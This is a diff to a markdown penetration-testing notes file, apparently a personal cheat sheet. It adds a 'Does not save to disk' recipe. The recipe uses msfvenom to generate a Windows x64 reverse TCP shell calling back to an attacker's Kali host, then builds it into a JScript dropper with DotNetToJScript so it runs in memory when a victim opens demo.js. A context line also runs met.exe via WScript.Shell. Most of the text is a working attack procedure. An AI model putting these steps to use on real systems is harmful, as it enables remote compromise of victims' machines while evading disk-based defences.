@@ -210,6 +210,7 @@ var r = new ActiveXObject("WScript.Shell").Run("met.exe");
 </details>
 
 ### Does not save to disk
+<details>
 1. `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali ip> LPORT=<port> EXITFUNC=thread -f csharp`
 2. I saved DotNetToJscript-master on the kali, copy it over, then run the .sln file. 
 3. Navigate to TestClass.cs (on the right), then use this to replace the `public class TestClass` part:
@@ -246,7 +247,13 @@ public class TestClass
         Process.Start(path);
     }
 }
-
+```
+4. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
+5. Click Build -> Build Solution
+6. Navigate to the `DotNetToJScript/bin/Release` folder and copy `DotNetToJscript.exe` and `NDesk.Options.dll` and then also go to `ExampleAssembly/bin/Release` folder and copy `ExampleAssembly.dll` into the same folder
+7. In that folder, run `DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js`
+8. Double-click demo.js
+</details>
 
 
 Credit: [Invicti](https://www.invicti.com/learn/reverse-shell)
